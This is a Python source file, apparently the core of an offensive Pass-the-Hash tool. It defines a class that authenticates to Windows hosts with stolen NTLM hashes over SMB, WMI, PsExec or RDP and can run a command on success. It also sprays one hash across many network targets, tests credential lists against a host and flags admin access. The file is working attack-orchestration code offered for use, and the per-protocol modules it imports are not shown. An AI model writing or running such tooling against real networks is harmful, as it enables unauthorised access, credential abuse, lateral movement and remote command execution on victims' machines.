"""
Core Pass-the-Hash Framework
Main orchestrator for all PTH operations
"""

import sys
from pathlib import Path
from typing import List, Optional

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from models import (
    Credential,
    AuthResult,
    SprayResult,
    FrameworkConfig,
    AccessLevel
)
from ..methods import get_auth_method, list_methods
from ..reports import ReportGenerator, SprayReporter
from ..utils.output import output
from ..utils.files import ensure_directory


class PassTheHashFramework:
    """
    Main Pass-the-Hash Framework

    Orchestrates authentication attempts, spraying operations,
    and report generation.

    Usage:
        framework = PassTheHashFramework()

        # Single target
        result = framework.authenticate(
            target="192.168.1.100",
            credential=Credential("admin", "aad3b435...", "CORP"),
            method="smb"
        )

        # Spray across network
        results = framework.spray_hash(
            targets=["192.168.1.100", "192.168.1.101"],
            credential=Credential("admin", "aad3b435...", "CORP"),
            method="smb"
        )

        # Generate report
        framework.generate_report()
    """

    def __init__(self, config: Optional[FrameworkConfig] = None):
        """
        Initialize framework

        Args:
            config: Optional configuration object
        """
        self.config = config or FrameworkConfig()
        self.output_dir = ensure_directory(self.config.output_dir)
        self.report = ReportGenerator(str(self.output_dir))

        output.success("Pass-the-Hash Framework initialized")
        output.success(f"Output directory: {self.output_dir}")

    def authenticate(self, target: str, credential: Credential,
                     method: str = "smb", command: Optional[str] = None) -> AuthResult:
        """
        Perform single authentication attempt

        Args:
            target: Target IP or hostname
            credential: Credential object with username, hash, domain
            method: Authentication method ('smb', 'wmi', 'psexec', 'rdp')
            command: Optional command to execute on success

        Returns:
            AuthResult with attempt details
        """
        auth_method = get_auth_method(method, timeout=self.config.timeout)
        result = auth_method.authenticate(target, credential, command)

        self.report.add_result(result)

        return result

    def spray_hash(self, targets: List[str], credential: Credential,
                   method: str = "smb") -> SprayResult:
        """
        Spray single hash across multiple targets

        Args:
            targets: List of target IPs/hostnames
            credential: Credential to spray
            method: Authentication method to use

        Returns:
            SprayResult with success/failure lists
        """
        output.banner("HASH SPRAYING ACROSS NETWORK")
        output.info(f"Targets: {len(targets)}")
        output.info(f"User: {credential}")
        output.info(f"Method: {method}")

        spray_reporter = SprayReporter(str(self.output_dir))
        auth_method = get_auth_method(method, timeout=self.config.timeout)

        for target in targets:
            output.info(f"Testing {target}...")

            result = auth_method.authenticate(target, credential)
            spray_reporter.add_result(result)
            self.report.add_result(result)

            if result.success and result.access_level == AccessLevel.ADMIN:
                output.success(f"ADMIN ACCESS on {target}!")

        return spray_reporter.finalize()

    def test_credentials(self, target: str, credentials: List[Credential],
                         method: str = "smb") -> List[Credential]:
        """
        Test multiple credentials against single target

        Args:
            target: Target to test against
            credentials: List of credentials to test
            method: Authentication method

        Returns:
            List of valid credentials
        """
        output.banner("CREDENTIAL TESTING")
        output.info(f"Target: {target}")
        output.info(f"Credentials to test: {len(credentials)}")
        output.info(f"Method: {method}")

        auth_method = get_auth_method(method, timeout=self.config.timeout)
        valid_creds = []

        for cred in credentials:
            output.info(f"Testing: {cred}")

            result = auth_method.authenticate(target, cred)
            self.report.add_result(result)

            if result.success:
                valid_creds.append(cred)
                output.success("Valid credentials found!")

        output.newline()
        output.success(f"Valid credentials: {len(valid_creds)}")

        return valid_creds

    def generate_report(self) -> None:
        """Generate and save final report"""
        self.report.print_summary()
        self.report.save_json()

    @staticmethod
    def available_methods() -> List[str]:
        """Get list of available authentication methods"""
        return list_methods()